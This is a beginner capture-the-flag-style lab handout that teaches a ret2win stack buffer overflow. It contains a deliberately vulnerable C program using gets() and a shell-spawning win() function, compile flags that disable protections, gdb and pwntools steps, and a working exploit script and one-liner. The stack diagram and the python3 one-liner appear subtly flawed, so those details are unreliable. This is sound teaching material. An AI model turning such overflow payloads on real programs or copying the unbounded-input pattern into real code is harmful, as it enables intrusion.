# Lab 2: picoCTF-Style Buffer Overflow – ret2win Attack

**Time required:** 40–50 minutes  
**Difficulty:** Beginner → Intermediate  
**Goal:** Overflow a buffer and jump straight to the hidden `win()` function  
**Author:** Latha Shree K P  

---
## Where We Are in the Journey

| Lab | What you learned                          | What you can do now                  |
|-----|-------------------------------------------|--------------------------------------|
| 1   | Simple overflow → change a variable       | Spill into nearby memory             |
| 2   | Control the saved return address          | Jump anywhere → ret2win              |

Today we go from “spilling water” to “telling the program to go to the secret room”.

---
## Section 1: The Vulnerable Program

### Source code (`vuln.c`)
```c
#include <stdio.h>
#include <stdlib.h>

void win() {
    puts("Congratulations! You redirected execution to win()");
    puts("This is a classic ret2win attack.");
    system("/bin/sh");                // drops you a shell instantly
}

void vulnerable() {
    char buffer[32];
    puts("What's your name?");
    gets(buffer);                     // DANGEROUS – no bounds checking!
    printf("Hello, %s!\n", buffer);
}

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    puts("Welcome to picoCTF-style Buffer Overflow 1");
    vulnerable();
    puts("Exiting normally...");
    return 0;
}
```

### Breaking Down the Vulnerability
- `char buffer[32];` → only 32 bytes of space  
- `gets(buffer);` → reads unlimited input → classic stack overflow  
- `win()` exists but is **never called** → perfect ret2win target!

### Compiled with (already done)
```bash
gcc -m32 -fno-stack-protector -no-pie -w -o vuln vuln.c
```

---
## Section 2: Stack Layout

```
Higher memory addresses
┌────────────────────┐
│ saved EBP (4 B)    │
├────────────────────┤
│ saved EIP ←←←←←←←┤   ← We overwrite THIS!
├────────────────────┤
│ buffer[31]         │
│ ...                │
│ buffer[0]  (32 B)  │
└────────────────────┘
Lower memory addresses
```

We need exactly **44 bytes** of input to reach and overwrite the saved return address (EIP).

---
## Section 3: Finding the Exact Offset

```bash
python3 -c "from pwn import *; print(cyclic(100))" | ./vuln
# Program crashes → EIP = 0x61616168 (example)

python3 -c "from pwn import *; print(cyclic_find(0x61616168))"
# → 44
```

**Offset = 44 bytes**

---
## Section 4: Address of win()

```bash
gdb -q vuln
(gdb) p win
$1 = {<text variable, no debug info>} 0x8049186 <win>
(gdb) quit
```

**win() address = 0x8049186** → little-endian: `\x86\x91\x04\x08`

---
## Section 5: The Exploit

Payload = 44 × 'A' + `\x86\x91\x04\x08`

**One-liner (instant shell)**
```bash
(python3 -c "print('A'*44 + '\x86\x91\x04\x08')"; cat) | ./vuln
```

**Full pwntools script (`exploit.py`)**
```python
#!/usr/bin/env python3
from pwn import *

p = process("./vuln")
win_addr = 0x8049186

payload  = b"A" * 44
payload += p32(win_addr)

p.sendline(payload)
p.interactive()
```

---
## Section 6: What Actually Happens
1. `vulnerable()` called → normal stack frame  
2. We send 48 bytes → saved EIP becomes `0x8049186`  
3. `vulnerable()` returns → CPU jumps to `win()`  
4. `win()` prints message + spawns shell

---
## Section 7: Troubleshooting

| Problem                     | Solution                                    |
|-----------------------------|---------------------------------------------|
| Immediate segfault          | Wrong offset → redo `cyclic_find`           |
| Wrong value in EIP          | Re-run `p win` in gdb                       |
| Address changes every run   | Recompile with `-no-pie`                    |
| No output / hangs           | Check binary name and current directory     |

---
## Section 8: Quick Reference

```bash
# Find offset
python3 -c "from pwn import *; print(cyclic_find(0x61616168))"    # → 44

# win address of win()
gdb -q vuln -ex "p win" -ex quit                                   # → 0x8049186

# One-liner
(python3 -c "print('A'*44 + '\x86\x91\x04\x08')"; cat) | ./vuln

# Run exploit
python3 exploit.py
```

Done! You just completed a real picoCTF-style ret2win attack!
